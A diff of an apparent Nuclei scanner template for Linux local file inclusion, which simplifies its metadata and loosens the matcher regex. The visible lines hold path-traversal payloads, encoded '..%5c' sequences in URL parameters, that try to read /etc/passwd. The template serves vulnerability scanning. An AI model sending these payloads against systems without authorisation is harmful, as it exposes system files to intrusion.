@@ -1,17 +1,11 @@
 id: linux-lfi-fuzzing
 
 info:
-  name: Linux - Local File Inclusion Fuzzing
+  name: Linux based LFI Fuzzing
   author: geeknik,unstabl3,pentest_swissky,sushantkamble,0xSmiley
   severity: high
-  description: Multiple fuzzes for /etc/passwd on passed URLs were conducted, leading to multiple instances of local file inclusion vulnerability.
-  classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
-    cvss-score: 7.5
-    cwe-id: CWE-200
-  metadata:
-    max-request: 22
-  tags: linux,lfi,fuzz,fuzzing,vuln
+  description: Fuzzes for /etc/passwd on passed URLs
+  tags: linux,lfi,fuzz
 
 http:
   - method: GET
@@ -38,11 +32,9 @@ http:
       - "{{BaseURL}}/file?filename=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
       - "{{BaseURL}}/file?name=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
       - "{{BaseURL}}/?q=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
-
     stop-at-first-match: true
     matchers:
       - type: regex
         regex:
-          - "root:.{0,20}:0:0:"
+          - "root:.*:0:0:"
         part: body
-# digest: 490a00463044022073c5452b3772979586d9e67de6e1e8c024f381f5663a1aa21d0194a04086fa0602203e22833f20a8d48e091ff88728c890d2588ae2d082b08a1664c9d06059fdb206:922c64590222798bb761d5b6d8e72950
